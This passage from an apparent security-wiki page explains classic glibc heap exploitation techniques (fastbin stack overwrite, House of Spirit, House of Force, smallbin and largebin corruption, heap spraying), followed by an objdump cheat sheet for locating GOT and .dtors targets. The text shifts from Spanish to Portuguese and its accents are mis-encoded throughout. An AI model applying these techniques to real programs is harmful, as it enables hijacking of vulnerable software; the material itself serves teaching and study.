Adem√°s, se tiene que cumplir que el chunk contiguo al liberado debe ser mayor que 8. Dado que hemos dicho que el size del chunk liberado es 8, en este chunk falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el chunk liberado, habr√° que poner al principio un jmp que caiga en nops).

Adem√°s, ese mismo chunk falso debe ser menor que av->system\_mem. av->system\_mem se encuentra 1848 bytes m√°s all√°.

Por culpa de los nulos de \_DTOR\_END\_ y de las pocas direcciones en la GOT, ninguna direcci√≥n de estas secciones sirve para ser sobrescrita, as√≠ que veamos c√≥mo aplicar fastbin para atacar la pila.

Otra forma de ataque es redirigir el **av** hacia la pila.

Si modificamos el size para que sea 16 en vez de 8, entonces fastbin\_index() nos devolver√° fastbins\[0\] y podemos hacer uso de esto para sobrescribir la pila.

Para esto, no debe haber ning√∫n canary ni valores extra√±os en la pila, de hecho, tenemos que encontrarnos en esta: 4 bytes nulos + EBP + RET.

Los 4 bytes nulos se necesitan para que el **av** est√© a esta direcci√≥n y el primer elemento de un **av** es el mutex que tiene que valer 0.

El **av->max\_fast** ser√° el EBP y ser√° un valor que nos servir√° para saltarnos las restricciones.

En el **av->fastbins\[0\]** se sobrescribir√° con la direcci√≥n de **p** y ser√° el RET, as√≠ se saltar√° a la shellcode.

Adem√°s, en **av->system\_mem** (1484 bytes por encima de la posici√≥n en la pila) habr√° bastante basura que nos permitir√° saltarnos la comprobaci√≥n que se realiza.

Adem√°s, se tiene que cumplir que el chunk contiguo al liberado debe ser mayor que 8. Dado que hemos dicho que el size del chunk liberado es 16, en este chunk falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el chunk liberado, habr√° que poner al principio un jmp que caiga en nops que van despu√©s del campo size del nuevo chunk falso).

**The House of Spirit**

En este caso, buscamos tener un puntero a un malloc que pueda ser alterado por el atacante (por ejemplo, que el puntero est√© en el stack debajo de un posible desbordamiento de una variable).

As√≠, podr√≠amos hacer que este puntero apunte a donde sea. Sin embargo, no cualquier sitio es v√°lido, el tama√±o del chunk falso debe ser menor que av->max\_fast y, m√°s espec√≠ficamente, igual al tama√±o solicitado en una futura llamada a malloc()+8. Por ello, si sabemos que despu√©s de este puntero vulnerable se llama a malloc(40), el tama√±o del chunk falso debe ser igual a 48.
**A Casa da For√ßa**

√â necess√°rio:

* Um overflow em um chunk que permita sobrescrever o wilderness
* Uma chamada para malloc() com um tamanho definido pelo usu√°rio
* Uma chamada para malloc() cujos dados possam ser definidos pelo usu√°rio

O primeiro passo √© sobrescrever o tamanho do chunk wilderness com um valor muito grande (0xffffffff), assim qualquer solicita√ß√£o de mem√≥ria grande o suficiente ser√° tratada em \_int\_malloc() sem a necessidade de expandir o heap.

O segundo passo √© alterar o av->top para que aponte para uma √°rea de mem√≥ria sob o controle do atacante, como a pilha. Em av->top, colocamos \&EIP - 8.

Precisamos sobrescrever av->top para que aponte para a √°rea de mem√≥ria sob o controle do atacante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

A vari√°vel "victim" armazena o valor do endere√ßo do chunk wilderness atual (o av->top atual) e "remainder" √© exatamente a soma desse endere√ßo mais a quantidade de bytes solicitados pelo malloc(). Portanto, se \&EIP-8 estiver em 0xbffff224 e av->top contiver 0x080c2788, ent√£o a quantidade que precisamos reservar no malloc controlado para que av->top aponte para $EIP-8 para o pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

Assim, o valor alterado ser√° armazenado em av->top e o pr√≥ximo malloc apontar√° para o EIP e poder√° ser sobrescrito.

√â importante saber que o tamanho do novo chunk wilderness deve ser maior do que a solicita√ß√£o feita pelo √∫ltimo malloc(). Ou seja, se o wilderness estiver apontando para \&EIP-8, o tamanho ficar√° exatamente no campo EBP da pilha.

**A Casa do Conhecimento**

**Corrup√ß√£o do SmallBin**

Os chunks liberados s√£o inseridos no bin de acordo com seu tamanho. Mas antes de serem inseridos, eles s√£o armazenados em unsorted bins. Quando um chunk √© liberado, ele n√£o √© imediatamente inserido em seu bin, mas permanece em unsorted bins. Em seguida, se um novo chunk for alocado e o chunk anterior liberado puder ser usado, ele ser√° retornado. No entanto, se um chunk maior for alocado, o chunk liberado em unsorted bins ser√° inserido em seu bin apropriado.

Para explorar o c√≥digo vulner√°vel, a solicita√ß√£o de mem√≥ria deve ser maior que av->max\_fast (normalmente 72) e menor que MIN\_LARGE\_SIZE (512).

Se houver um chunk no bin com o tamanho adequado ao que est√° sendo solicitado, ele ser√° retornado ap√≥s ser desvinculado:

bck = victim->bk; Aponta para o chunk anterior, √© a √∫nica informa√ß√£o que podemos alterar.

bin->bk = bck; O pen√∫ltimo chunk se torna o √∫ltimo, caso bck aponte para a pilha, o pr√≥ximo chunk alocado receber√° esse endere√ßo.

bck->fd = bin; Fecha a lista fazendo com que ela aponte para o bin.

S√£o necess√°rios:

Dois mallocs, de modo que o primeiro possa ser estourado depois que o segundo for liberado e inserido em seu bin (ou seja, um malloc maior que o segundo chunk deve ser alocado antes do estouro).

O malloc alocado ao qual o atacante escolhe o endere√ßo deve ser controlado pelo atacante.

O objetivo √© o seguinte: se pudermos estourar um heap que tenha um chunk liberado abaixo dele e em seu bin, podemos alterar seu ponteiro bk. Se alterarmos seu ponteiro bk e esse chunk se tornar o primeiro da lista do bin e for alocado, enganaremos o bin e diremos que o √∫ltimo chunk da lista (o pr√≥ximo a ser oferecido) est√° no endere√ßo falso que escolhemos (como a pilha ou a GOT, por exemplo). Portanto, se outro chunk for alocado e o atacante tiver permiss√µes nele, ele receber√° um chunk na posi√ß√£o desejada e poder√° escrever nele.

Ap√≥s liberar o chunk modificado, √© necess√°rio alocar um chunk maior do que o liberado, para que o chunk modificado saia de unsorted bins e seja inserido em seu bin.

Uma vez em seu bin, √© hora de modificar o ponteiro bk por meio do estouro para que ele aponte para o endere√ßo que queremos sobrescrever.

Assim, o bin deve esperar at√© que malloc() seja chamado v√°rias vezes para que o bin modificado seja usado novamente e engane o bin, fazendo-o acreditar que o pr√≥ximo chunk est√° no endere√ßo falso. Em seguida, o chunk desejado ser√° fornecido.

Para que a vulnerabilidade seja executada o mais r√°pido poss√≠vel, o ideal seria: alocar o chunk vulner√°vel, alocar o chunk que ser√° modificado, liberar esse chunk, alocar um chunk maior que ser√° modificado, modificar o chunk (vulnerabilidade), alocar um chunk do mesmo tamanho do chunk violado e alocar um segundo chunk do mesmo tamanho, que ser√° o que aponta para o endere√ßo escolhido.

Para proteger esse ataque, √© usada a verifica√ß√£o t√≠pica de que o chunk "n√£o" √© falso: verifica-se se bck->fd est√° apontando para victim. Ou seja, em nosso caso, se o ponteiro fd\* do chunk falso apontado na pilha est√° apontando para victim. Para contornar essa prote√ß√£o, o atacante deve ser capaz de escrever de alguma forma (provavelmente na pilha) no endere√ßo adequado o endere√ßo de victim. Para que pare√ßa um chunk verdadeiro.

**Corrup√ß√£o do LargeBin**

S√£o necess√°rios os mesmos requisitos que antes e mais alguns, al√©m disso, os chunks alocados devem ser maiores que 512.

O ataque √© semelhante ao anterior, ou seja, √© necess√°rio modificar o ponteiro bk e todas essas chamadas para malloc(), mas tamb√©m √© necess√°rio modificar o tamanho do chunk modificado de forma que size - nb seja < MINSIZE.

Por exemplo, definir size como 1552 para que 1552 - 1544 = 8 < MINSIZE (a subtra√ß√£o n√£o pode ser negativa porque √© comparada com um valor n√£o assinado).

Al√©m disso, foi introduzido um patch para torn√°-lo ainda mais complicado.

**Heap Spraying**
Basicamente, consiste em alocar o m√°ximo de mem√≥ria poss√≠vel para heaps e preench√™-los com uma sequ√™ncia de nops seguida de um shellcode. Al√©m disso, como preenchimento, utiliza-se 0x0c. A ideia √© tentar saltar para o endere√ßo 0x0c0c0c0c e, assim, se algum endere√ßo que ser√° chamado for sobrescrito com esse preenchimento, o salto ser√° feito para l√°. A t√°tica b√°sica √© alocar o m√°ximo poss√≠vel de mem√≥ria para ver se algum ponteiro √© sobrescrito e saltar para 0x0c0c0c0c, esperando que haja nops l√°.

**Heap Feng Shui**

Consiste em alocar e liberar mem√≥ria de forma a deixar peda√ßos alocados entre peda√ßos livres. O buffer a ser estourado ser√° colocado em um desses peda√ßos.

**objdump -d execut√°vel** ‚Äî> Desmonta fun√ß√µes\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> Obt√©m o endere√ßo da fun√ß√£o\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar se √© realmente nosso shellcode e obter os OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabela de s√≠mbolos, para obter o endere√ßo de vari√°veis e fun√ß√µes\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Para obter o endere√ßo de fun√ß√µes de bibliotecas (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obt√©m o endere√ßo de puts para sobrescrever na GOT\
**objdump -D ./exec** ‚Äî> Desmonta TUDO at√© as entradas da plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Informa√ß√µes da fun√ß√£o no gdb

## Cursos interessantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Refer√™ncias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
